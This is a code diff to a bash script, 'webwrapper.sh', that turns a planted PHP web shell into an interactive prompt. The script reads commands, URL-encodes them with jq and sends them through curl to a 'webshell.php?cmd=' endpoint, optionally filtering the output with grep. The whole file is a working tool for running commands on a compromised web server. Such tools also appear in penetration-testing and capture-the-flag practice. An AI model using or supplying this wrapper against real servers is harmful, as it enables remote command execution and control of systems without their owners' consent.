@@ -1,9 +1,15 @@
 #!/bin/bash
+echo -e "Usage: ./webwrapper.sh http://localhost:8000/webshell.php?cmd= ['grep_arguments']"
 
-# usage
-echo -e "Usage: ./webwrapper.sh http://localhost:8000/webshell.php?cmd="
+url="$1"
+gargs="$2"
 
-while true
-	read -p '>' webcmd
-	do curl $1$(printf "$webcmd" | jq -sRr '@uri')
+while true; do
+  read -p '>' webcmd
+  output=$(curl -s "$url$(printf "$webcmd" | jq -sRr '@uri')" --output -)
+  if [ "$2" ]; then
+    echo "$output" | grep $gargs
+  else
+    echo "$output"
+  fi
 done
